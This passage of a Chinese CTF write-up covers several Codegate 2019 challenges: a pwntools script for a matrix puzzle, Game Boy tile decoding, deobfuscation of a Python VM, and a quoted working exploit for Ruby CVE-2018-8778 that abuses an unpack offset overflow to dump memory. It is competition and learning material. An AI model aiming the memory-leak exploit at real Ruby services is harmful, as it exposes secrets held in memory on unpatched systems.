class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = remote('110.10.147.104', 15712)</span></span><br><span class="line">p = remote(<span class="string">'110.10.147.109'</span>, <span class="number">15712</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'If you want to start, type the G key within 10 seconds....&gt;&gt;'</span>, <span class="string">'G'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span><span class="params">(m)</span>:</span></span><br><span class="line">    size = len(m)</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">        res.append(m[i][size - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(size - <span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        res[<span class="number">0</span>] += m[<span class="number">0</span>][i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, size):</span><br><span class="line">            res[j] = min(res[j - <span class="number">1</span>] + m[j][i], res[j] + m[j][i])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(size - <span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">            res[j] = min(res[j], res[j + <span class="number">1</span>] + m[j][i])</span><br><span class="line">    <span class="keyword">return</span> min(res)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'*** STAGE &#123;&#125; ***\n'</span>.format(str(i + <span class="number">1</span>)))</span><br><span class="line">    matrix = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        t = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">        row = []</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(len(t) / <span class="number">3</span>):</span><br><span class="line">            <span class="comment"># print type(t[3*k:3*(k+1)].strip(' '))</span></span><br><span class="line">            row.append(int(t[<span class="number">3</span>*k:<span class="number">3</span>*(k+<span class="number">1</span>)].strip(<span class="string">' '</span>)))</span><br><span class="line">        matrix.append(row)</span><br><span class="line">    <span class="comment"># print matrix</span></span><br><span class="line">    min_length = cal(matrix)</span><br><span class="line">    flag += chr(min_length)</span><br><span class="line">    payload = str(min_length)</span><br><span class="line">    p.sendlineafter(<span class="string">'Answer within 10 seconds &gt;&gt;&gt;'</span>, payload)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, base64.b64decode(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="THE-Matrix"><a href="#THE-Matrix" class="headerlink" title="THE Matrix"></a>THE Matrix</h1><p>看了<a href="https://github.com/pwning/public-writeup/tree/master/codegate2019/THE_Matrix" target="_blank" rel="noopener">PPP大佬们的writeup</a>，下了个<a href="http://bgb.bircd.org/#downloads" target="_blank" rel="noopener">BGB</a>来调试，同时可以查看内存以及patch。放上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">data = [<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x62</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x78</span>, <span class="number">0x78</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xE3</span>, <span class="number">0xE3</span>, <span class="number">0xF3</span>, <span class="number">0xF3</span>, <span class="number">0xFB</span>, <span class="number">0xFB</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>, <span class="number">0xCF</span>, <span class="number">0xCF</span>, <span class="number">0xC7</span>, <span class="number">0xC7</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0xC6</span>, <span class="number">0xC6</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0xEE</span>, <span class="number">0x6C</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0xBA</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xE3</span>, <span class="number">0xE3</span>, <span class="number">0xF3</span>, <span class="number">0xF3</span>, <span class="number">0xFB</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>, <span class="number">0xCF</span>, <span class="number">0xCF</span>, <span class="number">0xC7</span>, <span class="number">0xC7</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0xA5</span>, <span class="number">0xA5</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0xE7</span>, <span class="number">0x81</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0xDB</span>, <span class="number">0x81</span>, <span class="number">0xDB</span>, <span class="number">0x81</span>, <span class="number">0xDB</span>, <span class="number">0x81</span>, <span class="number">0xC3</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0x99</span>, <span class="number">0x81</span>, <span class="number">0x99</span>, <span class="number">0x81</span>, <span class="number">0x99</span>, <span class="number">0x81</span>, <span class="number">0x99</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xA5</span>, <span class="number">0xA5</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0xC3</span>, <span class="number">0xDB</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xFF</span>, <span class="number">0xE7</span>, <span class="number">0xFF</span>, <span class="number">0xC3</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xA5</span>, <span class="number">0xFF</span>, <span class="number">0x81</span>, <span class="number">0xE7</span>, <span class="number">0xDB</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x1F</span>, <span class="number">0x1F</span>, <span class="number">0x31</span>, <span class="number">0x3F</span>, <span class="number">0x61</span>, <span class="number">0x7F</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0x61</span>, <span class="number">0x7F</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0x1F</span>, <span class="number">0x1F</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x9D</span>, <span class="number">0xE3</span>, <span class="number">0x8D</span>, <span class="number">0xF3</span>, <span class="number">0x85</span>, <span class="number">0xFB</span>, <span class="number">0xA1</span>, <span class="number">0xDF</span>, <span class="number">0xB1</span>, <span class="number">0xCF</span>, <span class="number">0xB9</span>, <span class="number">0xC7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line">tiles = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">    tiles += [[data[x * <span class="number">16</span> + y] <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">16</span>)]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> [<span class="number">13</span>, <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]:</span><br><span class="line">    tile = tiles[c]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> tile:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'0'</span>*<span class="number">8</span> + bin(x)[<span class="number">2</span>:])[<span class="number">-8</span>:].replace(<span class="string">'0'</span>, <span class="string">' '</span>).replace(<span class="string">'1'</span>, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\n'</span></span><br></pre></td></tr></table></figure><h1 id="mini-converter"><a href="#mini-converter" class="headerlink" title="mini converter"></a>mini converter</h1><p>给了一份ruby的源码。看了writeup知道了是<a href="https://blog.sqreen.io/buffer-under-read-ruby/" target="_blank" rel="noopener">CVE-2018-8778</a>。ruby的版本在2.5.1之前存在这个格式化字符串的整数溢出漏洞，漏洞如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts input.unpack(<span class="string">"C*<span class="subst">#&#123;input&#125;</span>.length"</span>)</span><br></pre></td></tr></table></figure><p>这里将输入转换成unpack方法，我们就可以控制unpack的结果来泄漏flag。在ruby的unpack格式中，<code>@</code>可以跳过参数长度给的偏移。如果我们送一个很大的正数，那么就会溢出成负数。从而我们可以泄露之前的内容，包括flag。这里放一下<a href="https://github.com/leesh3288/CTF/blob/master/2019/CODEGATE/mini%20converter/mini_converter_writeup.md" target="_blank" rel="noopener">大佬的exp</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'110.10.147.105'</span>, <span class="number">12137</span>)</span><br><span class="line">p.recvuntil(<span class="string">'to exit\n'</span>)</span><br><span class="line">targlen = <span class="number">0x10000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    payload = <span class="string">'a @&#123;&#125;a&#123;&#125; '</span>.format(<span class="number">2</span>**<span class="number">64</span> - targlen*i, targlen + <span class="number">0x100</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'hex\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'memdump #&#123;&#125;'</span>.format(i)</span><br><span class="line">    data = p.recvuntil(<span class="string">'to exit\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'FLAG&#123;'</span> <span class="keyword">in</span> data:</span><br><span class="line">        st = data.find(<span class="string">'FLAG&#123;'</span>)</span><br><span class="line">        <span class="keyword">print</span> data[st:data.find(<span class="string">'&#125;'</span>, st) + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="PyProt3ct"><a href="#PyProt3ct" class="headerlink" title="PyProt3ct"></a>PyProt3ct</h1><p>一道有点难的虚拟机，所有的变量还有函数名几乎都是形如<code>O0O0OOO00OO00O000</code>的混淆。先简单地解混淆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = open(<span class="string">'play.py.bak'</span>)</span><br><span class="line">t = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># func</span></span><br><span class="line">pat = <span class="string">r'def ([O0]&#123;17&#125;)'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">func = reg.findall(t)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(func)):</span><br><span class="line">  t = t.replace(func[i], <span class="string">'f&#123;&#125;'</span>.format(str(i)))</span><br><span class="line"><span class="comment"># arg</span></span><br><span class="line">pat = <span class="string">r'def f\d\d?\(([O0]&#123;17&#125;)\)'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">arg = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(arg)):</span><br><span class="line">  t = t.replace(arg[i], <span class="string">'dic'</span>)</span><br><span class="line"><span class="comment"># else</span></span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=dict\(\)'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">dic = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">  t = t.replace(dic[i], <span class="string">'dic'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=1000'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">ret_addr = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ret_addr)):</span><br><span class="line">  t = t.replace(ret_addr[i], <span class="string">'ret_addr'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=1001'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">ret_val = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ret_val)):</span><br><span class="line">  t = t.replace(ret_val[i], <span class="string">'ret_val'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=2001'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">str1 = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">  t = t.replace(str1[i], <span class="string">'str1'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=2002'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">str2 = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">  t = t.replace(str2[i], <span class="string">'str2'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=2003'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">str3 = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str3)):</span><br><span class="line">  t = t.replace(str3[i], <span class="string">'str3'</span>)</span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)=2004'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">str4 = reg.findall(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str4)):</span><br><span class="line">  t = t.replace(str4[i], <span class="string">'str4'</span>)</span><br><span class="line"><span class="comment"># rest</span></span><br><span class="line">pat = <span class="string">r'([O0]&#123;17&#125;)'</span></span><br><span class="line">reg = re.compile(pat)</span><br><span class="line">rest = reg.findall(t)</span><br><span class="line">rest = list(set(rest))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rest)):</span><br><span class="line">  t = t.replace(rest[i], <span class="string">'x&#123;&#125;'</span>.format(str(i)))</span><br><span class="line">f = open(<span class="string">'play.py'</span>, <span class="string">'wb'</span>)</span><br><span class="line">f.write(t)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">key</th><th style="text-align:center">content (purpose)</th></tr></thead><tbody><tr><td style="text-align:center">1000</td><td style="text-align:center">return address (mostly int, but object is theoretically possible)</td></tr><tr><td style="text-align:center">1001</td><td style="text-align:center">return value (mostly int, but object is theoretically possible)</td></tr><tr><td style="text-align:center">2001, 2002, 2003, 2004</td><td style="text-align:center">instruction argument (== oparg) (always byte array)</td></tr></tbody></table><p><a href="https://blog.metamon.xyz/2019/01/31/codegate-2019-qual-writeup/" target="_blank" rel="noopener">以上几个数字判断对应几个key</a>。然后逐个函数判断指令功能。这里放一下<a href="https://raw.githubusercontent.com/pwning/public-writeup/master/codegate2019/pyprot3ct/play.py" target="_blank" rel="noopener">ppp大佬给的分析脚本</a>。记录一下<a href="https://balsn.tw/ctf_writeup/20190126-codegatectf/#pyprot3ct" target="_blank" rel="noopener">Balsn大佬们给的加密过程</a>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(x)</span>:</span></span><br><span class="line">    a = x &gt;&gt; <span class="number">32</span></span><br><span class="line">    a ^= <span class="number">0xffc2bdec</span></span><br><span class="line">    a += <span class="number">0xffc2bdec</span></span><br><span class="line">    a &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    b = x &amp; <span class="number">0xffffffff</span></span><br><span class="line">    b ^= <span class="number">0xffc2bdec</span></span><br><span class="line">    b += <span class="number">0xffc2bdec</span></span><br><span class="line">    b &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    c = ((b &lt;&lt; <span class="number">32</span>) | a)&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line">    d = ((c &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">57</span>)&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ((c &gt;&gt; <span class="number">7</span>) | d) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">flag = str(input())</span><br><span class="line">flag = int(<span class="string">'0x'</span> + flag.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x7f</span>):</span><br><span class="line">    flag = encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(flag)</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="number">0xd274a5ce60ef2dca</span></span><br></pre></td></tr></table></figure><p><a href="https://balsn.tw/ctf_writeup/20190126-codegatectf/#pyprot3ct" target="_blank" rel="noopener">Balsn大佬们的solve脚本</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(x)</span>:</span></span><br><span class="line">    c = ((x &lt;&lt; <span class="number">7</span>) | (x &gt;&gt; <span class="number">57</span>))&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line">    b = ((((c &gt;&gt; <span class="number">32</span>)&amp;<span class="number">0xffffffff</span>)<span 